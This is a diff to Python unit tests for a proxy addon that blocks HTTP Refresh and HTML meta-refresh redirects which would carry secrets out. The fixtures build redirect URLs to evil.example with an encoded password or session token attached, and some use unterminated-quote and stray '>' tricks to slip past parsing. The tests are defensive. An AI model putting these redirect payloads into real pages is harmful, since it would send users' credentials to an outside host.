@@ -2750,9 +2750,28 @@ class RefreshSecretTests(unittest.TestCase):
         # part of what the client navigates to, so the check sees it.
         self.assertEqual(t("0;url=https://evil.example/cb;token=1"),
                          "https://evil.example/cb;token=1")
+        # Unterminated quote: browsers strip the lone opening quote
+        # and navigate anyway — the check must see the same target.
+        self.assertEqual(t('0;url="https://evil.example/cb?k=1'),
+                         "https://evil.example/cb?k=1")
         self.assertIsNone(t("5"))
         self.assertIsNone(t("0; url="))
         self.assertIsNone(t(""))
+
+    def test_refresh_unterminated_quote_neutralized(self):
+        # `url="...` with no closing quote: the browser strips the
+        # lone quote and follows the secret-bearing URL; the check
+        # must not read it as a harmless relative reference.
+        enc = urllib.parse.quote(SECRETS["pw"], safe="")
+        refresh = '0;url="https://evil.example/cb?k=' + enc
+        self.assertNotIn(SECRETS["pw"], refresh)
+        a, flow, resp = self._flow(200, refresh)
+        a.responseheaders(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn(("github.com", "refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+        self.assertEqual(resp.headers.get("refresh"),
+                         "hsurr:refresh-secret-refused")
 
 
 class MetaRefreshSecretTests(unittest.TestCase):
@@ -2847,7 +2866,50 @@ class MetaRefreshSecretTests(unittest.TestCase):
         self.assertNotIn("hsurr:meta-refresh-secret-refused", resp.text)
         self.assertEqual(a.audit_notes, [])
 
-    def test_meta_refresh_gt_inside_quoted_attr_still_scanned(self):
+    def test_meta_refresh_gt_inside_content_value_still_scanned(self):
+        # A `>` inside the content value itself (before the secret):
+        # the browser parses the full tag and follows the URL, so the
+        # scan must see the whole tag too — not truncate at the `>`.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?pad=>&k=' + enc.encode() + b'">')
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_unterminated_quote_neutralized(self):
+        # `url="...` with no closing quote inside the content value:
+        # the browser strips the lone quote and navigates anyway.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" content=\'0;url="'
+                b'https://evil.example/cb?k=' + enc.encode() + b"'>")
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_check_error_neutralizes_fail_closed(self):
+        # A detection-path exception must neutralize, never forward
+        # the possibly secret-bearing URL, and the failure is audited.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?k=' + enc.encode() + b'">')
+        a, flow, resp = self._flow(body)
+        with mock.patch.object(sa.SwapAddon, "_redirect_target_host",
+                               side_effect=RuntimeError("boom")):
+            a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "meta-refresh-check-error"), a.audit_notes)
         # A `>` inside a quoted attribute BEFORE content must not
         # truncate the tag: the browser parses (and follows) the full
         # tag, so the scan must see it too.
